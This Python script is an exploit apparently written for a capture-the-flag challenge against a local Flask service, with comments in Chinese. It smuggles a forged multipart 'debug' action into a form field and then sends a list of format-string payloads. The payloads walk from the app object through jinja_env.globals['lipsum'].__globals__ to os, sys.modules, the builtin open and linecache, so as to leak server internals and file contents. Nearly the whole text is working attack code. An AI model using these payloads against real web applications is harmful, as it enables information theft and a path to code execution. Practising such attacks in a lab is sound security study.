import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 尝试找到已存在的 Path 对象实例
# 通过遍历 gc.get_objects() 可以找到，但我们不能调用函数

# 让我换个思路 - 利用 format string 的特性
# format 可以用 !r !s !a 转换
# 可以用 :spec 格式化

# 尝试利用 __format__ 方法 - 某些对象的 __format__ 可能会触发副作用
payloads = [
    # 检查 format string 的不同格式化选项
    ('{0!r}', 'app repr (truncated)'),
    ('{0!s}', 'app str'),
    
    # 检查 config 的 items
    ('{0.config.keys}', 'config.keys method'),
    
    # 尝试获取 gc 模块
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[gc]}', 'gc module'),
    
    # 检查 builtins 中的 open
    ('{0.jinja_env.globals[lipsum].__globals__[__builtins__][open]}', 'open function'),
    
    # 检查 traceback 模块
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[traceback]}', 'traceback'),
    
    # 检查 linecache - 可能有缓存的文件内容
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[linecache]}', 'linecache'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[linecache].cache}', 'linecache.cache'),
    
    # 检查 importlib
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[importlib]}', 'importlib'),
    
    # pkgutil 可能有目录信息
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[pkgutil]}', 'pkgutil'),
]

for p, desc in payloads:
    try:
        result = format_string_leak(p)
        result = result[:5000] if len(result) > 5000 else result
        print(f"[{desc}]: {result}\n")
    except Exception as e:
        print(f"[{desc}]: Error - {e}\n")
